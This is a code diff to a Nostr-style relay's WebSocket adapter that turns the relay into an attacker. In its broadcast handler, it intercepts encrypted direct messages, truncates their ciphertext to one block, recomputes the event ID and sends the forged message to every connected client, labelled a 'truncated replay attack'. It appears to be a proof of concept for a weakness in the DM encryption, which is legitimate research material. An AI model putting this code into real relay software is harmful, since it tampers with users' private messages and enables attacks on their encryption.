@@ -11,6 +11,9 @@ import { getRemoteAddress } from '../utils/http'
 import { isRateLimited } from '../handlers/request-handlers/rate-limiter-middleware'
 import { Settings } from '../@types/settings'
 import { WebServerAdapter } from './web-server-adapter'
+import {EventKinds} from "../constants/base";
+import {getEventHash, isEventMatchingFilter} from "../utils/event";
+import {createOutgoingEventMessage} from "../utils/messages";
 
 const debug = createLogger('web-socket-server-adapter')
 
@@ -70,16 +73,55 @@ export class WebSocketServerAdapter extends WebServerAdapter implements IWebSock
   }
 
   private onBroadcast(event: Event) {
-    this.webSocketServer.clients.forEach((webSocket: WebSocket) => {
-      if (!propEq('readyState', OPEN)(webSocket)) {
-        return
+    console.log('---------')
+    console.log('event')
+    console.log(event)
+    // do truncated replay attack on EncryptedDM
+    if(event.kind == EventKinds.ENCRYPTED_DIRECT_MESSAGE) {
+      // eslint-disable-next-line @typescript-eslint/ban-ts-comment
+      // @ts-ignore
+      const a = event.content.split('?')
+      let iv = ''
+      let ct = ''
+      if(a[1].includes('iv=')){
+        iv = a[1]
+        ct = a[0]
+      }else{
+        iv = a[0]
+        ct = a[1]
       }
-      const webSocketAdapter = this.webSocketsAdapters.get(webSocket) as IWebSocketAdapter
-      if (!webSocketAdapter) {
-        return
-      }
-      webSocketAdapter.emit(WebSocketAdapterEvent.Event, event)
-    })
+      // eslint-disable-next-line @typescript-eslint/ban-ts-comment
+      // @ts-ignore
+      event.content = Buffer.from(ct, 'base64').slice(0, 16).toString('base64') +'?'+ iv
+
+      getEventHash(event).then(id =>{
+        event.id = id
+        console.log('forged DM')
+        console.log(event)
+        console.log('---------')
+        this.webSocketServer.clients.forEach((webSocket: WebSocket) => {
+          if (!propEq('readyState', OPEN)(webSocket)) {
+            return
+          }
+          const webSocketAdapter = this.webSocketsAdapters.get(webSocket) as IWebSocketAdapter
+          if (!webSocketAdapter) {
+            return
+          }
+          webSocketAdapter.emit(WebSocketAdapterEvent.Event, event)
+        })
+      })
+    }else{
+      this.webSocketServer.clients.forEach((webSocket: WebSocket) => {
+        if (!propEq('readyState', OPEN)(webSocket)) {
+          return
+        }
+        const webSocketAdapter = this.webSocketsAdapters.get(webSocket) as IWebSocketAdapter
+        if (!webSocketAdapter) {
+          return
+        }
+        webSocketAdapter.emit(WebSocketAdapterEvent.Event, event)
+      })
+    }
   }
 
   public getConnectedClients(): number {
